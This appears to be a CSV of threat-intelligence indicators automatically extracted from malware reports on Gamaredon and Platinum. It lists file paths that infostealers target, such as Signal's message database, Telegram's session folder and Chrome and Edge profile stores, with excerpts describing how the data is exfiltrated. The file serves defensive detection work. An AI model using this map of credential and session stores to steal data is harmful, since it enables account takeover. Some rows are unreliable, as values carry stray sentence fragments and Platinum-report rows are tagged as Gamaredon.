schema_version,actor_ref,artifact_id,observation_id,artifact_type,value,normalized_value,disposition,observed_at,observed_at_precision,observed_at_status,observed_at_basis,source_published_at,source_id,source_path,source_location,campaign_refs,malware_refs,infrastructure_refs,roles,campaign_count,seen_in_multiple_campaigns,confidence,tlp,extraction_method,context_excerpt,analyst_notes
1.0.0,actor--gamaredon,artifact--sha256:76c8e04f50b7909fd9f3d3d5caf660a0eb4bcc09600ee261192b13c793623a32,observation--sha256:b9f3c410f846a0c6e981a56d71ffe3d594cbb432c04c615371b4e07135c9efda,file-path,"%APPDATA%\Signal\config.json , allowing","%APPDATA%\Signal\config.json , allowing",candidate,,unknown,unknown,not-stated,,source--gamaredon--0512c893b55f399d,Gamaredon/cyberespionage-gamaredon-way.pdf,"{""page"": 30}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"29 Cyberespionage the Gamaredon way: Analysis of toolset used to spy on Ukraine in 2022 and 2023 If it finds any profile with a saved password, it exfiltrates the data from the following registry values of this key: · Account Name · Email · IMAP Server · IMAP Port · IMAP User · SMTP Port · SMTP Server It also exfiltrates the IMAP Password from the registry, but this data is first decrypted before exfiltration by using [System.Security.Cryptography.ProtectedData]::Unprotect . PteroCookie Discover",
1.0.0,actor--gamaredon,artifact--sha256:eb5974e87480df810efa480e85c8a8d12cc19ec0b55c3f725bafc92fc4516ab1,observation--sha256:ac9502f9b12d93aec25635b539a255cfcc4659057e822d13e7875169735d4fe6,file-path,"%APPDATA%\Signal\sql\db.sqlite , contains sensitive information like sent and received messages. The","%APPDATA%\Signal\sql\db.sqlite , contains sensitive information like sent and received messages. The",candidate,,unknown,unknown,not-stated,,source--gamaredon--0512c893b55f399d,Gamaredon/cyberespionage-gamaredon-way.pdf,"{""page"": 30}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"29 Cyberespionage the Gamaredon way: Analysis of toolset used to spy on Ukraine in 2022 and 2023 If it finds any profile with a saved password, it exfiltrates the data from the following registry values of this key: · Account Name · Email · IMAP Server · IMAP Port · IMAP User · SMTP Port · SMTP Server It also exfiltrates the IMAP Password from the registry, but this data is first decrypted before exfiltration by using [System.Security.Cryptography.ProtectedData]::Unprotect . PteroCookie Discover",
1.0.0,actor--gamaredon,artifact--sha256:e58f96dfd2ee20dfbc7d3e9a9745a5871df5fc5e60af2d0ba609327a8e69c9ed,observation--sha256:09015c1d252fe42e9ca5f5cdbc1ff45ad689104d8bb832281fbc8941775c1ebd,file-path,%APPDATA%\Signal\sql\db.sqlite  is present on the,%APPDATA%\Signal\sql\db.sqlite is present on the,candidate,,unknown,unknown,not-stated,,source--gamaredon--0512c893b55f399d,Gamaredon/cyberespionage-gamaredon-way.pdf,"{""page"": 30}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"29 Cyberespionage the Gamaredon way: Analysis of toolset used to spy on Ukraine in 2022 and 2023 If it finds any profile with a saved password, it exfiltrates the data from the following registry values of this key: · Account Name · Email · IMAP Server · IMAP Port · IMAP User · SMTP Port · SMTP Server It also exfiltrates the IMAP Password from the registry, but this data is first decrypted before exfiltration by using [System.Security.Cryptography.ProtectedData]::Unprotect . PteroCookie Discover",
1.0.0,actor--gamaredon,artifact--sha256:7efa792b42851952f9780f632b43cab7756c2c73993bd721b8303ab484ef8fed,observation--sha256:09e8fec7665a8c78f7703e852b5786480efc40100297b7cc13152e21662fa99e,file-path,"%APPDATA%\Telegram Desktop \tdata directory , perhaps to keep the stolen session unique .","%APPDATA%\Telegram Desktop \tdata directory , perhaps to keep the stolen session unique",candidate,,unknown,unknown,not-stated,,source--gamaredon--0512c893b55f399d,Gamaredon/cyberespionage-gamaredon-way.pdf,"{""page"": 31}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"30 Cyberespionage the Gamaredon way: Analysis of toolset used to spy on Ukraine in 2022 and 2023 PteroGram Discovered by ESET Research in June 2023, PteroGram (SHA -1: AC17FD08A3987CC91DFD6649BA3DABE8A9671305 ) is a PowerShell infostealer targeting the Telegram Desktop application. Telegram Desktop stores its data in %APPDATA%\Telegram Desktop \tdata, which contains encrypted session data. The encryption key is derived from a passcode and salt, but if no passcode is set, an empty string is used ",
1.0.0,actor--gamaredon,artifact--sha256:58b9e7f94011424e3997cbac9fb3c414007490868c3a5232b632125b8d01e7b8,observation--sha256:e9a803292fa789b15bf08a4c6dedc9eba84037971b60c0f53729a50445a37703,file-path,%APPDATA%\Telegram Desktop \tdata with names that are 16 characters long and exfiltrates all files,%APPDATA%\Telegram Desktop \tdata with names that are 16 characters long and exfiltrates all files,candidate,,unknown,unknown,not-stated,,source--gamaredon--0512c893b55f399d,Gamaredon/cyberespionage-gamaredon-way.pdf,"{""page"": 31}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"30 Cyberespionage the Gamaredon way: Analysis of toolset used to spy on Ukraine in 2022 and 2023 PteroGram Discovered by ESET Research in June 2023, PteroGram (SHA -1: AC17FD08A3987CC91DFD6649BA3DABE8A9671305 ) is a PowerShell infostealer targeting the Telegram Desktop application. Telegram Desktop stores its data in %APPDATA%\Telegram Desktop \tdata, which contains encrypted session data. The encryption key is derived from a passcode and salt, but if no passcode is set, an empty string is used ",
1.0.0,actor--gamaredon,artifact--sha256:8eac8f301436657a03727eb2d4718820f1c962cdcd3e2069d02b0ab80d2e54cf,observation--sha256:5bbbaca4b02de4a817f8a48037fd4d1b4d3294aa2ed3bda9307676d1053f4b87,file-path,"%APPDATA%\Telegram Desktop \tdata, then terminates the Telegram process and deletes the entire","%APPDATA%\Telegram Desktop \tdata, then terminates the Telegram process and deletes the entire",candidate,,unknown,unknown,not-stated,,source--gamaredon--0512c893b55f399d,Gamaredon/cyberespionage-gamaredon-way.pdf,"{""page"": 31}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"30 Cyberespionage the Gamaredon way: Analysis of toolset used to spy on Ukraine in 2022 and 2023 PteroGram Discovered by ESET Research in June 2023, PteroGram (SHA -1: AC17FD08A3987CC91DFD6649BA3DABE8A9671305 ) is a PowerShell infostealer targeting the Telegram Desktop application. Telegram Desktop stores its data in %APPDATA%\Telegram Desktop \tdata, which contains encrypted session data. The encryption key is derived from a passcode and salt, but if no passcode is set, an empty string is used ",
1.0.0,actor--gamaredon,artifact--sha256:d53f48b6e09def93c6592a135eaac228ad16e4afcbf41bac88d4f7dbe7b437a7,observation--sha256:8b4393ad8ce5b66f74cd8fd66d211c1750ee6b27721e34def70f4db143f928d3,file-path,"%APPDATA%\Telegram Desktop \tdata, which","%APPDATA%\Telegram Desktop \tdata, which",candidate,,unknown,unknown,not-stated,,source--gamaredon--0512c893b55f399d,Gamaredon/cyberespionage-gamaredon-way.pdf,"{""page"": 31}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"30 Cyberespionage the Gamaredon way: Analysis of toolset used to spy on Ukraine in 2022 and 2023 PteroGram Discovered by ESET Research in June 2023, PteroGram (SHA -1: AC17FD08A3987CC91DFD6649BA3DABE8A9671305 ) is a PowerShell infostealer targeting the Telegram Desktop application. Telegram Desktop stores its data in %APPDATA%\Telegram Desktop \tdata, which contains encrypted session data. The encryption key is derived from a passcode and salt, but if no passcode is set, an empty string is used ",
1.0.0,actor--gamaredon,artifact--sha256:97099b965c144109b49d77db942b74e9bc5ea9d44b8aa9ded32ac0d42d493052,observation--sha256:5536bf8668dc8f3f0d6504fb12b12d5cb837294868db03367275b9f1805b5c25,file-path,%Appdata%\db.bin are created. These files contain  MD5 hashes,%Appdata%\db.bin are created. These files contain MD5 hashes,candidate,,unknown,unknown,not-stated,,source--gamaredon--9d4f2351eb5fd5c0,Gamaredon/Technical report Armagedon.pdf,"{""page"": 23}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"is used when it is not possible to connect to the first address in the list. However, as mentioned before, if necessary, the link is changed to the current IP address to reconnect. FileStealer Files of this type have the extension .exe written in the C# programming lan guage using the .NET framework and are designed to collect files with the following extensions: *.doc, *.docx, *.xls, *.rtf, *.odt, *.txt, *.jpg, *.pdf. These files are collected from all active disks except CD drives. At the same",
1.0.0,actor--gamaredon,artifact--sha256:b5b60b2a8c7fc827312725b1aad7fddfd6fcf3ebfb4f491e6eb154267e62f6a3,observation--sha256:a75bd4ab9b57917ad50b560d839c0725b431b567ac8702d9027afaf74d4477dc,file-path,%LOCALAPPDATA%\ Google(x86)\ Chrome\User Data\ Default\,%LOCALAPPDATA%\ Google(x86)\ Chrome\User Data\ Default\,candidate,,unknown,unknown,not-stated,,source--gamaredon--0512c893b55f399d,Gamaredon/cyberespionage-gamaredon-way.pdf,"{""page"": 29}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"28 Cyberespionage the Gamaredon way: Analysis of toolset used to spy on Ukraine in 2022 and 2023 PteroScreen First seen by ESET Research in July 2022, PteroScreen (SHA-1: BA2366ED4E83FFC6DEC489C9011FE181CE169A47 ) is a PowerShell scree n-capturing tool that takes screenshots of all screens and temporarily stores the image in %TEMP% \<randomNumber>.png . The screenshot is then base64 encoded and uploaded to the C&C server along with the system drive ’s volume serial number via an HTTP POST reques",
1.0.0,actor--gamaredon,artifact--sha256:ef36d2e2a1830e6455e5cba0d19080b74d75ecd29669ed2ece43e0bbdd627047,observation--sha256:8385b1ebe736c46925c2b79d1b83f54aca80025df31c2e1063a6b9dc538cb3b1,file-path,%LOCALAPPDATA%\ Google(x86)\ Chrome\User Data\ Default\IndexedDB\,%LOCALAPPDATA%\ Google(x86)\ Chrome\User Data\ Default\IndexedDB\,candidate,,unknown,unknown,not-stated,,source--gamaredon--0512c893b55f399d,Gamaredon/cyberespionage-gamaredon-way.pdf,"{""page"": 31}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"30 Cyberespionage the Gamaredon way: Analysis of toolset used to spy on Ukraine in 2022 and 2023 PteroGram Discovered by ESET Research in June 2023, PteroGram (SHA -1: AC17FD08A3987CC91DFD6649BA3DABE8A9671305 ) is a PowerShell infostealer targeting the Telegram Desktop application. Telegram Desktop stores its data in %APPDATA%\Telegram Desktop \tdata, which contains encrypted session data. The encryption key is derived from a passcode and salt, but if no passcode is set, an empty string is used ",
1.0.0,actor--gamaredon,artifact--sha256:7f9daf684bdf5c4581dfb433d6e1ae8fcd31fae749c3ff05b1af3ed98a7393c3,observation--sha256:df58698c8e7d3ddecc5cebc8efe6c06ac37be7013a7c886d7697b2999e851ca4,file-path,%LOCALAPPDATA%\ Google(x86)\ Chrome\User Data\ Default\Local Storage\ leveldb\,%LOCALAPPDATA%\ Google(x86)\ Chrome\User Data\ Default\Local Storage\ leveldb\,candidate,,unknown,unknown,not-stated,,source--gamaredon--0512c893b55f399d,Gamaredon/cyberespionage-gamaredon-way.pdf,"{""page"": 31}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"30 Cyberespionage the Gamaredon way: Analysis of toolset used to spy on Ukraine in 2022 and 2023 PteroGram Discovered by ESET Research in June 2023, PteroGram (SHA -1: AC17FD08A3987CC91DFD6649BA3DABE8A9671305 ) is a PowerShell infostealer targeting the Telegram Desktop application. Telegram Desktop stores its data in %APPDATA%\Telegram Desktop \tdata, which contains encrypted session data. The encryption key is derived from a passcode and salt, but if no passcode is set, an empty string is used ",
1.0.0,actor--gamaredon,artifact--sha256:762fa82b4ff3a02df5fd86884a742cd1d85270ad396bdafdac3431bf085ec197,observation--sha256:38cab9009875d8604ca258c8d8fae7a990ef499677c230164f23d00be973e9e3,file-path,%LOCALAPPDATA%\ Google(x86)\ Chrome\User Data\ Default\Network\,%LOCALAPPDATA%\ Google(x86)\ Chrome\User Data\ Default\Network\,candidate,,unknown,unknown,not-stated,,source--gamaredon--0512c893b55f399d,Gamaredon/cyberespionage-gamaredon-way.pdf,"{""page"": 30}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"29 Cyberespionage the Gamaredon way: Analysis of toolset used to spy on Ukraine in 2022 and 2023 If it finds any profile with a saved password, it exfiltrates the data from the following registry values of this key: · Account Name · Email · IMAP Server · IMAP Port · IMAP User · SMTP Port · SMTP Server It also exfiltrates the IMAP Password from the registry, but this data is first decrypted before exfiltration by using [System.Security.Cryptography.ProtectedData]::Unprotect . PteroCookie Discover",
1.0.0,actor--gamaredon,artifact--sha256:6c50a66d32a81e71b77176367a6e7ed88bbb2deccb4a81e7bd7d581e7ddc6d24,observation--sha256:7f90a66ad52ad92f422a889f7605509022fe60b920b5bfc79b19bb41cacb7bf7,file-path,%LOCALAPPDATA%\ Google\Chrome\User Data \Default\,%LOCALAPPDATA%\ Google\Chrome\User Data \Default\,candidate,,unknown,unknown,not-stated,,source--gamaredon--0512c893b55f399d,Gamaredon/cyberespionage-gamaredon-way.pdf,"{""page"": 29}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"28 Cyberespionage the Gamaredon way: Analysis of toolset used to spy on Ukraine in 2022 and 2023 PteroScreen First seen by ESET Research in July 2022, PteroScreen (SHA-1: BA2366ED4E83FFC6DEC489C9011FE181CE169A47 ) is a PowerShell scree n-capturing tool that takes screenshots of all screens and temporarily stores the image in %TEMP% \<randomNumber>.png . The screenshot is then base64 encoded and uploaded to the C&C server along with the system drive ’s volume serial number via an HTTP POST reques",
1.0.0,actor--gamaredon,artifact--sha256:0f8d3522b338d3ca1139b9e7109f6502f1e1b3052ef9e1f6daf7204d6b65b634,observation--sha256:eded8ecca96661e5977270b4401b139f1aad03d8db18977f3cdcd6a0c05da4ca,file-path,%LOCALAPPDATA%\ Google\Chrome\User Data\ Default\IndexedDB\,%LOCALAPPDATA%\ Google\Chrome\User Data\ Default\IndexedDB\,candidate,,unknown,unknown,not-stated,,source--gamaredon--0512c893b55f399d,Gamaredon/cyberespionage-gamaredon-way.pdf,"{""page"": 31}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"30 Cyberespionage the Gamaredon way: Analysis of toolset used to spy on Ukraine in 2022 and 2023 PteroGram Discovered by ESET Research in June 2023, PteroGram (SHA -1: AC17FD08A3987CC91DFD6649BA3DABE8A9671305 ) is a PowerShell infostealer targeting the Telegram Desktop application. Telegram Desktop stores its data in %APPDATA%\Telegram Desktop \tdata, which contains encrypted session data. The encryption key is derived from a passcode and salt, but if no passcode is set, an empty string is used ",
1.0.0,actor--gamaredon,artifact--sha256:b5d0e583848151c59afdc88f5c242914c93dd3c963b72233ef5e895d73ffee76,observation--sha256:b4e1b4fba9027ff78f220f46967b210dbf1f7b1c77aa78a12310dcd15d745c30,file-path,%LOCALAPPDATA%\ Google\Chrome\User Data\ Default\Local Storage\ leveldb\,%LOCALAPPDATA%\ Google\Chrome\User Data\ Default\Local Storage\ leveldb\,candidate,,unknown,unknown,not-stated,,source--gamaredon--0512c893b55f399d,Gamaredon/cyberespionage-gamaredon-way.pdf,"{""page"": 31}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"30 Cyberespionage the Gamaredon way: Analysis of toolset used to spy on Ukraine in 2022 and 2023 PteroGram Discovered by ESET Research in June 2023, PteroGram (SHA -1: AC17FD08A3987CC91DFD6649BA3DABE8A9671305 ) is a PowerShell infostealer targeting the Telegram Desktop application. Telegram Desktop stores its data in %APPDATA%\Telegram Desktop \tdata, which contains encrypted session data. The encryption key is derived from a passcode and salt, but if no passcode is set, an empty string is used ",
1.0.0,actor--gamaredon,artifact--sha256:3b20c6afabd02d5e17fadc39d6e4ad37f74ea0f7cfa50507167a89cb0a3ce6ba,observation--sha256:1af0d32fc716938f0df7d208bd3e2a9af89e6f51ef1eaeaae8c7692681e6c572,file-path,%LOCALAPPDATA%\ Google\Chrome\User Data\ Default\Network\,%LOCALAPPDATA%\ Google\Chrome\User Data\ Default\Network\,candidate,,unknown,unknown,not-stated,,source--gamaredon--0512c893b55f399d,Gamaredon/cyberespionage-gamaredon-way.pdf,"{""page"": 30}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"29 Cyberespionage the Gamaredon way: Analysis of toolset used to spy on Ukraine in 2022 and 2023 If it finds any profile with a saved password, it exfiltrates the data from the following registry values of this key: · Account Name · Email · IMAP Server · IMAP Port · IMAP User · SMTP Port · SMTP Server It also exfiltrates the IMAP Password from the registry, but this data is first decrypted before exfiltration by using [System.Security.Cryptography.ProtectedData]::Unprotect . PteroCookie Discover",
1.0.0,actor--gamaredon,artifact--sha256:fea5d5bf385f765aa661460f9a6406f40566fd3cbf349d2cecc8b26d2e1eaf6d,observation--sha256:5c7ab378f89c5dad3219ff7fa1140e29d710f94a913ddc94bbff3071fa73b5c9,file-path,%LOCALAPPDATA%\ Microsoft\ Edge\User Data\ Default\,%LOCALAPPDATA%\ Microsoft\ Edge\User Data\ Default\,candidate,,unknown,unknown,not-stated,,source--gamaredon--0512c893b55f399d,Gamaredon/cyberespionage-gamaredon-way.pdf,"{""page"": 29}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"28 Cyberespionage the Gamaredon way: Analysis of toolset used to spy on Ukraine in 2022 and 2023 PteroScreen First seen by ESET Research in July 2022, PteroScreen (SHA-1: BA2366ED4E83FFC6DEC489C9011FE181CE169A47 ) is a PowerShell scree n-capturing tool that takes screenshots of all screens and temporarily stores the image in %TEMP% \<randomNumber>.png . The screenshot is then base64 encoded and uploaded to the C&C server along with the system drive ’s volume serial number via an HTTP POST reques",
1.0.0,actor--gamaredon,artifact--sha256:a2d760e9a985c0effc8b26cfb7bbdec00cbc449078d53dcf496aa10ea1cbc7fb,observation--sha256:4db01242266706d78edf12d3cd20a96fdb62b206cc5feb64ab263f4cc2e64b4e,file-path,%LOCALAPPDATA%\ Microsoft\ Edge\User Data\ Default\IndexedDB\,%LOCALAPPDATA%\ Microsoft\ Edge\User Data\ Default\IndexedDB\,candidate,,unknown,unknown,not-stated,,source--gamaredon--0512c893b55f399d,Gamaredon/cyberespionage-gamaredon-way.pdf,"{""page"": 31}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"30 Cyberespionage the Gamaredon way: Analysis of toolset used to spy on Ukraine in 2022 and 2023 PteroGram Discovered by ESET Research in June 2023, PteroGram (SHA -1: AC17FD08A3987CC91DFD6649BA3DABE8A9671305 ) is a PowerShell infostealer targeting the Telegram Desktop application. Telegram Desktop stores its data in %APPDATA%\Telegram Desktop \tdata, which contains encrypted session data. The encryption key is derived from a passcode and salt, but if no passcode is set, an empty string is used ",
1.0.0,actor--gamaredon,artifact--sha256:303995156d2d69979cd046ee76a6964b2c44676c9ee4adb063841cf24e0245b7,observation--sha256:51dd18689bef59f7cddbe2312e17640ffdaf82052a2a3db285ce1c336b4c80b4,file-path,%LOCALAPPDATA%\ Microsoft\ Edge\User Data\ Default\Local Storage\ leveldb\,%LOCALAPPDATA%\ Microsoft\ Edge\User Data\ Default\Local Storage\ leveldb\,candidate,,unknown,unknown,not-stated,,source--gamaredon--0512c893b55f399d,Gamaredon/cyberespionage-gamaredon-way.pdf,"{""page"": 31}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"30 Cyberespionage the Gamaredon way: Analysis of toolset used to spy on Ukraine in 2022 and 2023 PteroGram Discovered by ESET Research in June 2023, PteroGram (SHA -1: AC17FD08A3987CC91DFD6649BA3DABE8A9671305 ) is a PowerShell infostealer targeting the Telegram Desktop application. Telegram Desktop stores its data in %APPDATA%\Telegram Desktop \tdata, which contains encrypted session data. The encryption key is derived from a passcode and salt, but if no passcode is set, an empty string is used ",
1.0.0,actor--gamaredon,artifact--sha256:2f7bf135a60477240794b6b6613fc5e2e464cf96bbc1f39100882b0e10f74554,observation--sha256:7112fa6ae8cb2b176cf329bc0e3242dec48f59b61d36f09a516cbffc7d33366a,file-path,%LOCALAPPDATA%\ Microsoft\ Edge\User Data\ Default\Network\,%LOCALAPPDATA%\ Microsoft\ Edge\User Data\ Default\Network\,candidate,,unknown,unknown,not-stated,,source--gamaredon--0512c893b55f399d,Gamaredon/cyberespionage-gamaredon-way.pdf,"{""page"": 30}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"29 Cyberespionage the Gamaredon way: Analysis of toolset used to spy on Ukraine in 2022 and 2023 If it finds any profile with a saved password, it exfiltrates the data from the following registry values of this key: · Account Name · Email · IMAP Server · IMAP Port · IMAP User · SMTP Port · SMTP Server It also exfiltrates the IMAP Password from the registry, but this data is first decrypted before exfiltration by using [System.Security.Cryptography.ProtectedData]::Unprotect . PteroCookie Discover",
1.0.0,actor--gamaredon,artifact--sha256:aa9cac4166638db2c8a1bca5b2fa43e21f440d52db34591724105ed896f9d938,observation--sha256:c1ddee2608c655532f83f8bf061446d7b0f4b8fafa96df6480d2b5babfaa6ee9,file-path,"%LOCALAPPDATA%\Logic\,",%LOCALAPPDATA%\Logic\,candidate,,unknown,unknown,not-stated,,source--gamaredon--0512c893b55f399d,Gamaredon/cyberespionage-gamaredon-way.pdf,"{""page"": 14}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"13 Cyberespionage the Gamaredon way: Analysis of toolset used to spy on Ukraine in 2022 and 2023 Surprisingly, the update mechanism was completely removed from this version of PteroPSLoad. Regarding the communication protocol, two significant changes were made. The first one is that a new method of obtaining the IP address of the C&C server was added. PteroPSLoad now leverages a DNS - over-HTTPS (DoH) service provided by Cloudflare. To get the IP address, it sends an HTTP GET request to https://",
1.0.0,actor--gamaredon,artifact--sha256:ad2430033b1debf49880c895fbf3b50459e68271e53f3a9506c5f66e4286a2e3,observation--sha256:535027e7e70321ac05a49b5842f5160a3557213e8122bd0834d478aea17d6962,file-path,%TEMP%\sgn to its C&C server  via HTTP POS T requests but does not delete the local copies .,%TEMP%\sgn to its C&C server via HTTP POS T requests but does not delete the local copies,candidate,,unknown,unknown,not-stated,,source--gamaredon--0512c893b55f399d,Gamaredon/cyberespionage-gamaredon-way.pdf,"{""page"": 30}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"29 Cyberespionage the Gamaredon way: Analysis of toolset used to spy on Ukraine in 2022 and 2023 If it finds any profile with a saved password, it exfiltrates the data from the following registry values of this key: · Account Name · Email · IMAP Server · IMAP Port · IMAP User · SMTP Port · SMTP Server It also exfiltrates the IMAP Password from the registry, but this data is first decrypted before exfiltration by using [System.Security.Cryptography.ProtectedData]::Unprotect . PteroCookie Discover",
1.0.0,actor--gamaredon,artifact--sha256:7583ffd5e2efe2bb5c1b899f598129938e7af8fe5bb775f4f5402e446cf665b1,observation--sha256:343cd595a8b1ef97707d4ec2dcb985cf434eb07401085292037a75a966ed9f56,file-path,%Temp%\servicehubs\ and,%Temp%\servicehubs\ and,candidate,,unknown,unknown,not-stated,,source--gamaredon--9d4f2351eb5fd5c0,Gamaredon/Technical report Armagedon.pdf,"{""page"": 23}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"is used when it is not possible to connect to the first address in the list. However, as mentioned before, if necessary, the link is changed to the current IP address to reconnect. FileStealer Files of this type have the extension .exe written in the C# programming lan guage using the .NET framework and are designed to collect files with the following extensions: *.doc, *.docx, *.xls, *.rtf, *.odt, *.txt, *.jpg, *.pdf. These files are collected from all active disks except CD drives. At the same",
1.0.0,actor--gamaredon,artifact--sha256:ab536d6bb6aa48858cfa6c629d5b56b92672f3728f3e98060b50b4d90d7cbd49,observation--sha256:37aeb2ac816491d7a88afc655e83deb493991a4493560dbf490246502d4574b6,file-path,%Temp%\servicehubs\ using HttpWebRequest,%Temp%\servicehubs\ using HttpWebRequest,candidate,,unknown,unknown,not-stated,,source--gamaredon--9d4f2351eb5fd5c0,Gamaredon/Technical report Armagedon.pdf,"{""page"": 23}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"is used when it is not possible to connect to the first address in the list. However, as mentioned before, if necessary, the link is changed to the current IP address to reconnect. FileStealer Files of this type have the extension .exe written in the C# programming lan guage using the .NET framework and are designed to collect files with the following extensions: *.doc, *.docx, *.xls, *.rtf, *.odt, *.txt, *.jpg, *.pdf. These files are collected from all active disks except CD drives. At the same",
1.0.0,actor--gamaredon,artifact--sha256:235dfb17e0c0a5e18911b4bf3dc6303b18e0998c9bfc2e8d292ddec3a4b8def4,observation--sha256:7c86260bf8f958b82c42eb20203768a42beafb543cd9a1175e3e58a068e853bf,file-path,%appdata%\Comm\Jpin and,%appdata%\Comm\Jpin and,candidate,,unknown,unknown,not-stated,2016-01-01T00:00:00Z,source--gamaredon--b32b75e3cedfdb37,Gamaredon/Platinum feature article - Targeted attacks in South and Southeast Asia April 2016.pdf,"{""page"": 16}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Figure 15. Security-related processes avoided by the JPIN installer Process Security product 360tray.exe 360 Safeguard bdagent.exe BitDefender proguard.exe Process Guard blackd.exe BlackICE blackice.exe BlackICE savservice.exe Sophos Anti-Virus avp.exe Kaspersky Anti-Virus rstray.exe Rising Anti-virus cmccore.exe CMC Antivirus cmctrayicon.exe CMC Antivirus zhudongfangyu.exe 360 Safeguard After installing the backdoor, the installer deletes itself from the compromised computer. PLATINUM uses at l",
1.0.0,actor--gamaredon,artifact--sha256:af4664ddee6aaba63f6b9a5988b3a34b025928f587137c30d3e6f6a2e69b6b6f,observation--sha256:8db38b1085f60284fd2d30e3bbc3a6bf53f1138f664da71a5b880c95896822cc,file-path,%appdata%\Java\support,%appdata%\Java\support,candidate,,unknown,unknown,not-stated,2016-01-01T00:00:00Z,source--gamaredon--b32b75e3cedfdb37,Gamaredon/Platinum feature article - Targeted attacks in South and Southeast Asia April 2016.pdf,"{""page"": 17}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"• Communicate via FTP. • Send email via SMTP. • Change permissions on files using the cacls.exe command-line utility. JPIN can also target mobile suite applications and extract data from them. The backdoor contains code that looks for installed instances of Symbian, Blackberry, and Windows Phone management applications. If any are found, the backdoor logs sync dates, IMEI data, phone manufacturer and model information, software version date, memory, location, and capacity, among other things. Th",
1.0.0,actor--gamaredon,artifact--sha256:dee861c6820c756593916e341884fa5dab979aad9d7bdd01910140fb144b22cc,observation--sha256:4766be43212ddc24e0552cca77632e1ee10d97eca75ca464b6ec4ac196841753,file-path,%appdata%\support,%appdata%\support,candidate,,unknown,unknown,not-stated,2016-01-01T00:00:00Z,source--gamaredon--b32b75e3cedfdb37,Gamaredon/Platinum feature article - Targeted attacks in South and Southeast Asia April 2016.pdf,"{""page"": 17}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"• Communicate via FTP. • Send email via SMTP. • Change permissions on files using the cacls.exe command-line utility. JPIN can also target mobile suite applications and extract data from them. The backdoor contains code that looks for installed instances of Symbian, Blackberry, and Windows Phone management applications. If any are found, the backdoor logs sync dates, IMEI data, phone manufacturer and model information, software version date, memory, location, and capacity, among other things. Th",
1.0.0,actor--gamaredon,artifact--sha256:491bb915df68526c252913278160077b92775000b8832daf0ae23637c9280330,observation--sha256:5f36dd835fcfc382fad36175c4f1cd8bcb1622297ade417a96e9826a45134988,file-path,%userprofile%\AppData\Local\Java\Support,%userprofile%\AppData\Local\Java\Support,candidate,,unknown,unknown,not-stated,2016-01-01T00:00:00Z,source--gamaredon--b32b75e3cedfdb37,Gamaredon/Platinum feature article - Targeted attacks in South and Southeast Asia April 2016.pdf,"{""page"": 17}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"• Communicate via FTP. • Send email via SMTP. • Change permissions on files using the cacls.exe command-line utility. JPIN can also target mobile suite applications and extract data from them. The backdoor contains code that looks for installed instances of Symbian, Blackberry, and Windows Phone management applications. If any are found, the backdoor logs sync dates, IMEI data, phone manufacturer and model information, software version date, memory, location, and capacity, among other things. Th",
